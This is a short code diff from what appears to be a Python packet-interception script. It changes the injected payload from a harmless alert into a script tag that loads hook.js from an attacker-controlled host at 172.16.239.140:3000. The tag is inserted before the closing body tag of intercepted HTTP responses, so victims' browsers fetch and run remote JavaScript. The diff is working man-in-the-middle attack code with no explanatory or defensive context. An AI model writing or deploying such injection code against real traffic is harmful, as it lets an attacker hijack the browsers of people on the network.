@@ -51,7 +51,9 @@ def process_packet(packet):
                 print("[+] Response")
 
                 if decoded_load_str.find("</body>") > -1:
-                    injection_code = "<script>alert('hacked')</script>"
+                    injection_code = (
+                        "<script src='http://172.16.239.140:3000/hook.js'></script>"
+                    )
 
                     decoded_load_str = decoded_load_str.replace(
                         "</body>", injection_code + "</body>"
